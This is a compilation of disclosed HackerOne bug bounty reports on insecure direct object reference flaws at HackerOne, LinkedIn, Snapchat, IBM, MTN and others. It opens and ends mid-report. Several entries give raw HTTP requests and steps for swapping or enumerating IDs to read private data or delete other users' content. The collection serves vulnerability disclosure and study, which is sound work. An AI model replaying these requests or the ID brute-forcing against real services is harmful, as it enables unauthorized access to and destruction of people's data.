* I Found that any private reports can be accessed by sending a POST request to the `/bugs.json` endpoint. This vulnerable endpoint requires `organization_id`, which takes the organization's ID as a value. It also requires `text_query`, which is used to search for report IDs. within this  org  , Now you can append the example organization ID mentioned on the policy page, `58579`. and For the `text_query`, you can simply append a single digit, such as 1, or any other single number. This will query all reports containing this digit, provided they belong to the specified organization



### Step To Reproduce 

1.Send a POST request to this endpoint. You can change the organization_id to anything, but leave it as it is 

```

POST /bugs.json HTTP/2
Host: hackerone.com
Cookie:  __Host-session=Your-Session-Here
X-Csrf-Token: Your-Csrf-Here
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Te: trailers
Content-Length: 390

text_query=1&organization_id=58579&persist=true&sort_type=pg_search_rank&view=message&substates%5B%5D=new&substates%5B%5D=needs-more-info&substates%5B%5D=triaged&substates%5B%5D=resolved&substates%5B%5D=informative&substates%5B%5D=not-applicable&substates%5B%5D=duplicate&substates%5B%5D=retesting&substates%5B%5D=pending-program-review&substates%5B%5D=spam&duplicates_must_have_no_ref=true

```




### Poc Video

█████████

## Impact

idor lead to view private reports `title`,`url`,`id`,`state`,`substate`,`severity_rating`,`readable_substate`,`created_at`,`submitted_at`,`reporter_name`

---

### [Insecure Direct Object Reference Protection bypass by changing HTTP method in IBM Your Learning endpoint. ](https://hackerone.com/reports/2456603)

- **Report ID:** `2456603`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** IBM
- **Reporter:** @suryahss
- **Bounty:** - usd
- **Disclosed:** 2024-05-01T05:54:57.281Z
- **CVE(s):** -

**Summary (team):**

Insecure Direct Object Reference vulnerability was reported to IBM, analyzed and has been remediated. Thank you to our external researcher.

---

### [Attachment disclosure via summary report ](https://hackerone.com/reports/2442008)

- **Report ID:** `2442008`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** HackerOne
- **Reporter:** @xklepxn
- **Bounty:** - usd
- **Disclosed:** 2024-04-29T04:32:57.476Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

Hackerone provides a form for reporting vulnerabilities to various programs. where the form supports uploading files & previews (images or videos) but is not allowed to use file ids belonging to other accounts. but with the sumary report feature I as a hacker can reveal files belonging to other users just changing the id. this is very severe.


**Description:**

I have tried to call files belonging to other accounts through the submit report, edit report form but it doesn't work it always gets the response ```"was_successful":false,```. but fortunately I can find another endpoint that is able to read files belonging to other accounts, namely in the sumary report feature.

### Steps To Reproduce
If you look at the video I attached, there I made the scenario "failed to read other account files" & "successfully read other account files" as for the steps as follows:
note : left victim right attacker

1. the attacker creates a report either draft or existing, then creates a Hacker summary 
2. then edit the summary and give the file to. 
3. intercept with intercept change the attacker file id to the victim file id
4. boom file read in markdown preview.

{F3155289}

### POC 
I don't know, uploading large files takes too long in attacth, I just put the poc via yt. : https://████ (private video)
or in gdrive, if yt can't be seen yet  : https://███████

### Optional: Supporting Material/References (Screenshots)

####raw text in video :
```
attachment leaked via add sumary report :

victim file id : 
3155239

I WILL CHANGE F3155244 TO 3155239
ATTACKER file : 

3155241
3155242
"was_successful":true, (IF FILE FROM ATTACKER) I WILL CHANGE TO VICTIM FILE
"was_successful":false, WILL FALSE 

trying leak via content : false positive
leak via sumary : successful
```
#### endpoint affected  (attachment_ids)

```
PUT /reports/████/summaries/███████ HTTP/2
Host: hackerone.com
.....all header ...
Content-Length: 908
Origin: https://hackerone.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"id":████████,"category":"researcher","content":"TESTEDIT\n\n{F3155244} ","updated_at":"2024-03-30T17:16:29.625Z","user":{"id":█████,"username":"█████","name":"██████████████","bio":"please see pdfx","cleared":false,"verified":false,"website":null,"location":"","created_at":"2024-03-29T11:27:50.077Z","url":"https://hackerone.com/██████████","hackerone_triager":false,"hackerone_employee":false,"user_type":"hacker","profile_picture_urls":{"small":"/assets/avatars/default-█████.png","medium":"/assets/avatars/default-███████.png","xtralarge":"/assets/avatars/default-███████.png"}},"can_view?":true,"can_create?":true,"attachments":[],"action_type":"publish","attachment_ids":[
3155239]}
```

## Impact

This is very bad especially the id form is only numeric in order. I can just add all the file ids of the hackerone account. I can see other people's pocs if it's a video.

**Summary (team):**

A critical vulnerability was discovered in the HackerOne platform that allowed an attacker to gain unauthorized access to attachments belonging to other users through the report summary editing functionality. By manipulating attachment IDs in the request, an attacker could view sensitive files that should have been restricted. The core issue was an Insecure Direct Object Reference (IDOR) vulnerability (CWE-639) where attachment access was not properly validated across user accounts when editing summary reports. This posed a serious risk to the confidentiality of user data and could lead to disclosure of sensitive attack details and exploitation information and also loss of it.

Fortunately, this vulnerability was responsibly disclosed through our bug bounty program and remediated before it could be maliciously exploited or cause any data exposure.

Upon validation, the HackerOne team promptly implemented a fix to correctly validate attachment IDs and prevent unauthorized cross-user access via summary report editing.

HackerOne maintains a strong commitment to security and transparency. We are grateful to the ethical hacker community for their invaluable contributions in identifying vulnerabilities before malicious exploitation can occur.

**Summary (researcher):**

Here if you want to read the story behind me finding this vulnerability!

ID: https://blog.tegalsec.org/hackerone-got-hacked-how-can-i-steal-your-poc
EN: https://medium.com/@kresec/hackerone-got-hacked-how-can-i-steal-your-poc-01a9132c5aeb

Writeups are very useful for bug hunters for learning / reference material.
For developers: it is useful to make secure applications earlier by learning from bug hunter findings, even though you have tried but the application is getting bigger, more routes, you may miss it.

 .

---

### [An attacker can submit arbitrary projects to their service accounts and obtain full information on projects of other users.](https://hackerone.com/reports/2291999)

- **Report ID:** `2291999`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** LinkedIn
- **Reporter:** @marvelmaniac
- **Bounty:** - usd
- **Disclosed:** 2024-03-12T09:58:42.679Z
- **CVE(s):** -

**Summary (team):**

An IDOR issue was discovered in the Request Services feature, where an attacker can gain access to project details of other users by submitting work project requests. Henceforth, an attacker can obtain the details of project submitted to other service providers and submit their own proposals to the victim(owner of the project). We have resolved the issue on priority and paid a bounty to researcher.

**Summary (researcher):**

A IDOR issue was found in the `Request Services` feature of Linkedin where an attacker can gain work in the platform in unauthorized manner by submitting work projects of arbitrary users on Linkedin to themselves. Projects are created when we request a service from a service provider on linkedin and it is treated confidential data which can only be viewed by the owner and the service provider which the owner choose. However due to the IDOR issue, an attacker can obtain the project submitted to other service providers and submit their own proposals to the victim( owner of the project). This way they can gain work on the Linkedin platform. No user interaction was needed. ProjectIDs are integers and can be iterated.

{F3067774}
{F3067782}

Vulnerable Request -
```
POST /voyager/api/voyagerMarketplacesDashServiceMarketplaceEngagement?action=createEngagementV2&decorationId=com.linkedin.voyager.dash.deco.marketplaces.CreateEngagementResponse-4
Host: www.linkedin.com
.
.
.

{"projectUrn":"urn:li:fsd_marketplaceProject:(<PROJECT-ID>,SERVICE_MARKETPLACE)","providerProfileUrn":"urn:li:fsd_profile:<ATTACKER--SERVICE-ACCOUNT-ID>"}
```

---

### [IDOR vulnerability reveals additional information](https://hackerone.com/reports/1770858)

- **Report ID:** `1770858`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Semrush
- **Reporter:** @a_d_a_m
- **Bounty:** - usd
- **Disclosed:** 2024-03-07T10:04:31.113Z
- **CVE(s):** -

**Summary (team):**

An issue was identified in the Content Outline Builder product. Changing a user ID in a GraphQL request could reveal additional information about users of Content Outline builder. The subsequent internal review revealed no evidence of this vulnerability being exploited by unauthorized parties.

---

### [IDOR on Delete Email address features](https://hackerone.com/reports/2382484)

- **Report ID:** `2382484`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Mozilla
- **Reporter:** @ryujinx
- **Bounty:** - usd
- **Disclosed:** 2024-03-07T09:10:58.201Z
- **CVE(s):** -

**Summary (team):**

An Insecure direct object reference vulnerability was found in Mozilla Monitor which allowed any user to delete secondary email addresses in other users' accounts, using the email address ID. The vulnerability was fixed by ensuring that the delete operation is properly scoped to a particular user.

**Summary (researcher):**

Hello

---

### [IDOR allows information disclosure](https://hackerone.com/reports/1816900)

- **Report ID:** `1816900`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Semrush
- **Reporter:** @a_d_a_m
- **Bounty:** - usd
- **Disclosed:** 2024-03-05T17:37:53.549Z
- **CVE(s):** -

**Summary (team):**

Adam discovered a vulnerability related to information disclosure within the Social Media Inbox tool. This tool is designed to enable users to link their social media accounts, oversee content, and engage with their audience. It includes a task tracker feature, which allows users to delegate message management to their colleagues on Semrush. However, it was found that user can assign a message to any userid.
The subsequent internal review revealed no evidence of this vulnerability being exploited by unauthorized parties.

---

### [IDOR to account takeover on POST to █████████ by changing member_id parameter](https://hackerone.com/reports/2132183)

- **Report ID:** `2132183`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Mars
- **Reporter:** @xandsz
- **Bounty:** - usd
- **Disclosed:** 2024-01-30T19:27:21.231Z
- **CVE(s):** -

**Summary (team):**

The website endpoint "██████" is exposed to multiple identifier vulnerabilities, which could potentially result in a complete takeover of user accounts. If exploited, malicious actors could gain full control over the victim's account, posing a significant security risk.

---

### [IDOR in upload videos of a Channel on https://video.ibm.com](https://hackerone.com/reports/2085185)

- **Report ID:** `2085185`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** IBM
- **Reporter:** @tusnj
- **Bounty:** - usd
- **Disclosed:** 2023-08-31T13:47:40.244Z
- **CVE(s):** -

**Summary (team):**

IDOR in uploading videos to channels on https://video.ibm.com was reported to IBM, analyzed and has been remediated. Thank you to our external researcher.

---

### [IDOR - Delete all Licenses and certifications from users account using CreateOrUpdateHackerCertification GraphQL query](https://hackerone.com/reports/2122671)

- **Report ID:** `2122671`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** HackerOne
- **Reporter:** @harshdranjan
- **Bounty:** 12500 usd
- **Disclosed:** 2023-08-29T14:30:10.014Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Hey team,

While editing our **Licenses and certifications** if we change the ID number we can delete other users **Licenses and certifications**. it simply can be done by editing the ID number in our graphql query.
If change the ID from 1 to X possible range then we can delete all the **Licenses and certifications** present between these.


### Steps To Reproduce

1. Log in to your own account in two browsers A and B with User A and User B
2. Create your own **Licenses and certifications* in both the account
3. Now edit your own **Licenses and certifications* and Intercept this using a Burp Proxy 
4. Now In the body change the **ID** number and you will be able to delete all the **Licenses and certifications** present in HackerOne 
5. For now change the ID to the **Licenses and certifications** ID of the Other account and it will be deleted.

PoC Video: ████

## Impact

Able to delete all the **Licenses and certifications** present in HackerOne

---

### [Attackers can use TRIAL Premium only by paying **IDR 10,000.00** from the original price of `IDR462,400.00` per month](https://hackerone.com/reports/1808719)

- **Report ID:** `1808719`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** LinkedIn
- **Reporter:** @find_me_here
- **Bounty:** - usd
- **Disclosed:** 2023-08-24T03:01:41.772Z
- **CVE(s):** -

**Summary (team):**

Reporter found a method to tamper with the LinkedIn Premium pricing so that an attacker can subscriber for a LinkedIn Premium at a significant discount. This issue would be confined solely to the abuser at an individual account level. No other accounts nor users were affected.

**Summary (researcher):**

Enjoy with coffee while reading the disclosure article below.

https://aidilarf.medium.com/linkedin-bug-anyone-can-use-unlimited-trial-premium-on-accounts-that-have-used-trial-premium-1713332131b3

---

### [An IDOR that can lead to enumeration of a user and disclosure of email and phone number within cashier](https://hackerone.com/reports/1966006)

- **Report ID:** `1966006`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Unikrn
- **Reporter:** @miquinho
- **Bounty:** 3000 usd
- **Disclosed:** 2023-07-17T12:21:13.465Z
- **CVE(s):** -

**Summary (team):**

As an attacker, it was possible to exploit IDOR on https://cashier.unikrn.com.

Huge thanks to Miquinho for spotting that vulnerability on https://cashier.unikrn.com. It was during the https://cashier.unikrn.com/cashier/transaction-history session handshake where we found out you could actually get access to another customer's data.

Miquinho, the initial report was hard for our security team to reproduce, but you really helped to reproduce the issue. Thank you!

---

### [████ ' can change any account email and cannot retrieve his account and access it ' at ███](https://hackerone.com/reports/1952771)

- **Report ID:** `1952771`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Mars
- **Reporter:** @0xs4m
- **Bounty:** - usd
- **Disclosed:** 2023-06-23T14:54:18.014Z
- **CVE(s):** -

**Vulnerability Information:**

hi ███
i found ██████████ , i can change any account email and he cannot retrieve his account and access it easily.

i can't access to his account because url activation on new email don't work and give me error.

```
SyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data
```
but hackers will be able to disable access users to their account on the site.

  1. Go to registration page (████)
  2. Verified your account.
  3. Go to login page and login your account.


 For the fastly test, use this credentials to login (you can use this account attacker to send request to burp and test on victim's account's i was created) 

   * For Attacker

███████████
Password
███████████ : ███████

   * For Victim 1

████████████
Password
████ : ██████████

   * For Victim 2

██████████████
Password
█████████ : ████ For Victim 3

████
Password
██████████

i access to my account victim and i go to edit my profil and send request to burp to get id user for this account ( my method of video for the attacker account is the same that i did on the victim account to get her id user ).

so .. after login i go to edit my account attacker and send request to burp and send it to repeater .. i change my id to victim id and i change email to my new email and click send so i succeeded.

i received an activation message on my new email i click on active url .. despite give me an error message when i click on the link activation
```
SyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data
```
the change was made successfully and the victim cannot log into his account, as it will give him an error message when he logs in.

i created +5 account victim for testing that and its worked, and can kids hackers to change the id user to anything like 10 or 100 or any number and change email this account for that id user.

burp request
```
POST /_post/usuario_actualizar.php HTTP/1.1
Host: ████████
Cookie: ████
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/██████ Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: ████████
Content-Type: multipart/form-data; boundary=---------------------------297392175112058██████████7932062474594
Content-Length: 2851
Origin: ███████-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------297392175112058█████████████7932062474594
Content-Disposition: form-data; name="nombre"

attacker
-----------------------------297392175112058████7932062474594
Content-Disposition: form-data; name="apellido"

attacker
-----------------------------297392175112058███████7932062474594
Content-Disposition: form-data; name="email"

████████████
-----------------------------297392175112058███████7932062474594
Content-Disposition: form-data; name="rut"


-----------------------------297392175112058███7932062474594
Content-Disposition: form-data; name="idProvincia"

0
-----------------------------297392175112058███7932062474594
Content-Disposition: form-data; name="idLocalidad"

0
-----------------------------297392175112058███████████7932062474594
Content-Disposition: form-data; name="optin[usuario_info_miroyalcanin]"

no
-----------------------------297392175112058███████████7932062474594
Content-Disposition: form-data; name="optin[usuario_info_miroyalcanin]"

si
-----------------------------297392175112058████████7932062474594
Content-Disposition: form-data; name="optin[usuario_info_marspetcare]"

no
-----------------------------297392175112058██████████7932062474594
Content-Disposition: form-data; name="optin[usuario_info_marspetcare]"

si
-----------------------------297392175112058████7932062474594
Content-Disposition: form-data; name="optin[usuario_investigaciones]"

no
-----------------------------297392175112058██████████7932062474594
Content-Disposition: form-data; name="optin[usuario_investigaciones]"

si
-----------------------------297392175112058███████7932062474594
Content-Disposition: form-data; name="optin[usuario_info_perros]"

no
-----------------------------297392175112058██████7932062474594
Content-Disposition: form-data; name="optin[usuario_info_perros]"

si
-----------------------------297392175112058████████7932062474594
Content-Disposition: form-data; name="optin[usuario_info_gatos]"

no
-----------------------------297392175112058███████████7932062474594
Content-Disposition: form-data; name="optin[usuario_info_gatos]"

si
-----------------------------297392175112058██████████████7932062474594
Content-Disposition: form-data; name="switch_pass"

off
-----------------------------297392175112058███7932062474594
Content-Disposition: form-data; name="ck_oldpass"

Password
-----------------------------297392175112058███████7932062474594
Content-Disposition: form-data; name="oldpass"


-----------------------------297392175112058████████████7932062474594
Content-Disposition: form-data; name="clave"


-----------------------------297392175112058█████████████7932062474594
Content-Disposition: form-data; name="clave2"


-----------------------------297392175112058███████████7932062474594
Content-Disposition: form-data; name="█████"

88796
-----------------------------297392175112058████████7932062474594--
```
██████

## Impact

█████████████

**Summary (team):**

An Insecure Direct Object Reference (IDOR) vulnerability was present in the user profile update functionality on the  ██████████ website. The vulnerability allows an authenticated attacker to modify the email associated with any user account by manipulating the ' ██████████ ' parameter in the POST request sent to the ' ██████████ ' endpoint. The attacker can leverage this vulnerability to potentially take control of victim accounts by changing the email and initiating a password reset.

---

### [ read and message other user's messages](https://hackerone.com/reports/1744264)

- **Report ID:** `1744264`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Reddit
- **Reporter:** @beksem35
- **Bounty:** - usd
- **Disclosed:** 2023-05-18T13:56:34.566Z
- **CVE(s):** -

**Vulnerability Information:**

go to your account's chat page, stop the request and change the reddit session parameter, now leave the request and you will be able to access the test account's chat screen

send the request to the repeater change the reddit session parameter and send it then you will see the return result is 200

show reply in browser and copy and paste the address into your browser you will access the chat page of your test account

## Impact

other users' chat screen can be accessed
and message can be sent

---

### [Insecure Direct Object Reference (IDOR) - Delete Campaigns  ](https://hackerone.com/reports/1969141)

- **Report ID:** `1969141`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** HackerOne
- **Reporter:** @datph4m
- **Bounty:** - usd
- **Disclosed:** 2023-05-03T11:47:26.684Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Hi Team, 

I think I can delete any Campaigns based on campaign_id


### Steps To Reproduce

Follow the POST request below

````
POST /graphql HTTP/2
Host: hackerone.com
Cookie: yourcookie
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://hackerone.com/organizations/opensea_demo/campaigns/242/edit
Content-Type: application/json
X-Csrf-Token: ███
X-Product-Area: campaigns
X-Product-Feature: edit
X-Datadog-Origin: rum
X-Datadog-Parent-Id: 9027318766950450042
X-Datadog-Sampling-Priority: 1
X-Datadog-Trace-Id: 87799383677632658
Content-Length: 851
Origin: https://hackerone.com
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"operationName":"UpdateCampaign","variables":{"product_area":"campaigns","product_feature":"edit","input":{"campaign_id":"Z2lkOi8vaGFja2Vyb25lL0NhbXBhaWduLzI0NA==","team_id":"Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzU3MzI4","bounty_table_row_id":"Z2lkOi8vaGFja2Vyb25lL0JvdW50eVRhYmxlUm93LzEwODM2","start_date":"2023-05-05T09:00:00Z","end_date":"2023-05-08T05:00:00Z","critical":3,"high":2,"medium":1.5,"low":1.5,"structured_scope_ids":[],"researchers_information":"ccccccccccccccc"}},"query":"mutation UpdateCampaign($input: UpdateCampaignInput!) {\n  updateCampaign(input: $input) {\n    was_successful\n    errors {\n      edges {\n        node {\n          id\n          type\n          field\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}

````

Decode base64 of campaign_id to get **gid://hackerone/Campaign/244**

Increase or decrease the number after Campaign and re-encode it with base64

At the campaign_id parameter in the request change it to another program's ongoing campaign_id parameter.

Then send Campaign request of any program to be deleted.

## Impact

Can delete all Campaign on hackerone or any program

---

### [IDOR in TalentMAP API can be abused to enumerate personal information of all the users](https://hackerone.com/reports/1848176)

- **Report ID:** `1848176`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Department of State
- **Reporter:** @nhx1
- **Bounty:** - usd
- **Disclosed:** 2023-04-11T01:49:37.950Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

I hope you're having a good day. Before starting to describe this vulnerability, I would like to thank the HackerOne triage team for doing the difficult job of triaging all these issues. 

I observed an IDOR vulnerability in one of the endpoints in the Talentmap API. This vulnerability is similar to #1809328. In this report I will demonstrate ways to enumerate all user accounts in the Talentmap API logged in as a guest user. To triage this vulnerability, you need to manually build it in your system, the build instructions can be accessed in the report #1809328 where HackerOne team has successfully built the Talentmap API. However, if you're having issues building it, drop a message!

After building the API, please go inside the docker container and run the following commands to create_seeded_users.

1. `$ python manage.py create_demo_environment` 
2.  `$ python manage.py create_seeded_users`

Also, go into the docker container and create some test users:
1. `$ python manage.py create_user normalUser normaluser@gmail.com normalUser123 Normal User`
2.  `$ python manage.py create_user normalUser1 normaluser1@gmail.com normalUser123 Normal User`
3. `$ python manage.py create_user normalUser2 normaluser2@gmail.com normalUser123 Normal User`

** Some details: **
i. The vulnerable endpoint = http://localhost:8000/api/v1/permission/user/{USER_ID}/  

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. After running the API, browse `http://localhost:8000` and login using the credentials `username: guest , password: guestpassword ` , and copy the token obtained in the respones

{F2139636}

{F2139638}

  2. Send the following request to http://localhost:8000. Replace {USER_ID} to the user id of the user you want to enumerate information of. Replace {token} to the token you obtained in step 1

```
GET /api/v1/permission/user/{USER_ID}/ HTTP/1.1

Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:8000/
JWT: {token}
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
```

  3. Observe user information returned in the response

Additionally, you could also use Burp intruder to cycle through user-ids from 1 to 100 to get information of all users in the database.

{F2139641}

##Remediation Guidance

Implement access control mechanism. Allow the user to only fetch their information.

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

A malicious actor could fetch information of all users and cause a data breach

---

### [Unauthorized User can View Subscribers of Other Users Newsletters](https://hackerone.com/reports/1716300)

- **Report ID:** `1716300`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** LinkedIn
- **Reporter:** @tushar6378
- **Bounty:** - usd
- **Disclosed:** 2023-03-29T15:30:58.082Z
- **CVE(s):** -

**Summary (team):**

## Issue description
A creator can create a newsletter, the followers can subscribe to the newsletter. The owner of the newsletter can view the subscriber list by clicking the "subscriber" button.

 Server-side authorization checks are missing on 
``GET /voyager/api/voyagerPublishingDashSeriesSubscribers?decorationId=com.linkedin.voyager.dash.deco.publishing.SeriesSubscriberMiniProfile-2&count=10&q=contentSeries&seriesUrn=urn%3Ali%3Afsd_contentSeries%3A<NewsletterId>&start=0 HTTP/2"``. This gives an attacker the ability to view the subscriber list of other users' newsletters by replaying the vulnerable request using the victim ``NewsletterId``which is public. 

## Steps: 
1) Create a newsletter. 
2) Open the newsletter and click on "subscriber".
3) Capture the vulnerable request.
4) Replay the vulnerable request using victim's ``NewsletterId``.
5) The response will disclose the subscriber list and their details in the API Response.

## Impact

An attacker can view the subscriber list and details of other users' newsletters even though it is not possible through the application UI. by just replaying the vulnerable request with the victim's ``NewsletterId".

---

### [Delete anyone's content spotlight remotely.](https://hackerone.com/reports/1819832)

- **Report ID:** `1819832`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Snapchat
- **Reporter:** @prickn9
- **Bounty:** 15000 usd
- **Disclosed:** 2023-03-06T21:32:15.042Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Snapchat,
 Snapchat has viral video feature callled spotlight which alone was the biggest trend and increase snapchat users and profit in millions.
I found a way to delete anyone's spotlight remotely.

Please see the below poc:-

1. First go to https://my.snapchat.com/myposts and log in there.
2. You will see your posts .
3. Now turn burp suite and intercept.
4.Select any of your posts and click delete option.
5. Now capture the delete request. In delete request there is parameter of id


{"operationName":"DeleteStorySnaps","variables":{"ids":["███████"],"storyType":"SPOTLIGHT_STORY"},"query":"mutation DeleteStorySnaps($ids: [String!]!, $storyType: StoryType!) {\n  deleteStorySnaps(ids: $ids, storyType: $storyType)\n}\n"}

6. You just have to change this id parameter. You can easily get the id parameter. Now forward the request after replacing id with someone's else video id.

And the video of other user will get delete.

HOW TO GET ID PARAMETER

1. Whenever you share spotlight you can see the parameter in the url as:
https://story.snapchat.com/spotlight/█████


I have attached a video POC please check it out

## Impact

Delete anyone's Content Spotlight. Imagine deleting video biggest influencers and content creators.

---

### [IDOR for changing privacy settings on any memories](https://hackerone.com/reports/1733627)

- **Report ID:** `1733627`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** TikTok
- **Reporter:** @mrhavit
- **Bounty:** - usd
- **Disclosed:** 2023-01-27T17:20:18.832Z
- **CVE(s):** -

**Summary (team):**

An Insecure Direct Object Reference (IDOR) vulnerability was found within TikTok Now on Android, which would have allowed any user to change the "Who Can View" privacy setting for another users' Memory. We thank @mrhavit for reporting this to the team.

**Summary (researcher):**

https://medium.com/@mrhavit/how-i-found-an-insecure-direct-object-reference-in-tiktok-c7303addf223

---

### [Unauthorized access to resumes stored on LinkedIn](https://hackerone.com/reports/1777095)

- **Report ID:** `1777095`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** LinkedIn
- **Reporter:** @headhunter
- **Bounty:** - usd
- **Disclosed:** 2022-12-07T17:05:39.506Z
- **CVE(s):** -

**Summary (team):**

- Researcher found an IDOR on an endpoint where a recruiter could download resumes without the appropriate access
- This security issue was unintentionally introduced in late-October 2022 
- The reporter reached out and provided details to LinkedIn on this security issue in November 2022
- LinkedIn fixed the security issue within 24 hours of being notified
- Our investigation found no evidence of abuse

**Summary (researcher):**

As LinkedIn is heavily used by recruiters across the globe there are billions of resumes stored in the system.
 
There are several ways how resumes can be added to LinkedIn:
-	Case 1 - when candidate apply to the job post through LinkedIn “Easy Apply” feature and attach resume to the application. In this case access to this resume granted to applicant himself, recruiter who posted specific job on LinkedIn and potentially other recruiters from the company candidate applied to (if the company uses LinkedIn Recruiter product).
-	Case 2 - resume can be added to specific LinkedIn profile by recruiter within LinkedIn Recruiter product (tool similar to Applicant Tracking System). In this case access to this resume granted to recruiter who uploaded resume and potentially other recruiters from the same company.

Because of the discovered vulnerability the attacker had a possibility to iterate file IDs and get access to resumes of applicants who either apply to different LinkedIn job posts (case 1) or resumes of professionals which were uploaded to LinkedIn by recruiters (case 2 - without actual candidate application).

LinkedIn security team was very reactive for this report so vulnerability was fixed within very short timeframe.

---

### [Remove Every User, Admin, And Owner Out Of Their Teams on developers.mtn.com via IDOR + Information Disclosure](https://hackerone.com/reports/1448550)

- **Report ID:** `1448550`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** MTN Group
- **Reporter:** @wallotry
- **Bounty:** - usd
- **Disclosed:** 2022-12-01T17:34:30.586Z
- **CVE(s):** -

**Vulnerability Information:**

Hello world,

This vulnerability is too involved with regular users, in order for us to prevent any damage, we need 3 different user accounts we own. 
This gives us specific "user_id" and "team_id" to work with.
There's an Information Disclosure as a side effect of this vulnerability. User and team names are disclosed in the response from the server.

## Steps To Reproduce(POC)

==First, let's paint a mental picture of this vulnerability and the required conditions using accounts with imaginary user_id & team_id.
The vulnerability and conditions are realistic, the only imaginary thing is the user_id and team_id.==

 1. Create 3 accounts on developers.mtn.com(Account A, B, and C)

==My imaginary accounts:==
- A: First Account(imaginary user_id=1111 & team_id=0001)
- B: Second Account(imaginary user_id=1112 & team_id=0002)
- C: Third Account(imaginary user_id=1113 & team_id=0003)
 2. Login to A, Invite B to your Team A
 3. Login to B, Invite C to your team B
 4. Open Burp Suite
 5. Login to A, Remove B(Please Intercept This Request)
 6. Send the Intercepted request to the repeater tab
 7. Modify the request(Our Goal is to remove C from Team B, which we don't have access or permissions to.)
 8. Replace the team_id with Team B's team_id. Replace the user_id with C's user_id.
 9. Send the Request. (This Request will disclose C's username And Team B's name. Making this an information disclosure. PII)

{F1577574}

 10. C will be removed from B's Team B.
 11. C will receive an email from MTN telling him/her that he/she has been removed from Team B.

{F1577544}

## Steps To Reproduce(Removing Every User)

==This can be done with a custom script/code without the need for Burp Suite==
 1. Intercept the request for removing a user, and send it to the Burp Suite intercept tab.
 2. Config your settings to brute-force through every team_id and user_id. This part is not that hard because every user_id and team_id has only 4 digits.
 3. Run the intruder request. When there's a successful user_id and team_id match, the user whose ID has been matched, will be removed.
 4. If my calculations are correct, it should take 12 Hours to remove every user from every group they're in, the maximum being 20 Hours. The faster the internet speed, the faster the computer, the shorter the time it'll take to brute-force through every user_id and team_id.

## Exploitability
- Anyone with an account on developers.mtn.com can exploit this vulnerability
- All you need is a user_id and a team_id to remove a user from his/her team.(Their privileges don't matter, even the owner is vulnerable)

## Remediation
- Ensure proper session management and object-level user access control checks.
- Apply access control mechanisms such as permissions to certain action.
- Validation of access to a team_id.
- You should always check if a user submitting the request isn't tampering and isn't submitting any ID's that do not belong to his/her account.

## Reference
#1448475

## Impact

A low level user can remove his Admin and Owner from the team.
Every user will be removed from every team they are in, including owners and admins.

---

### [Unprotected Direct Object Reference](https://hackerone.com/reports/1536936)

- **Report ID:** `1536936`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** MTN Group
- **Reporter:** @coyemerald
- **Bounty:** - usd
- **Disclosed:** 2022-12-01T17:24:05.518Z
- **CVE(s):** -

**Vulnerability Information:**

Hello MTN Security Team,
During my hunting,
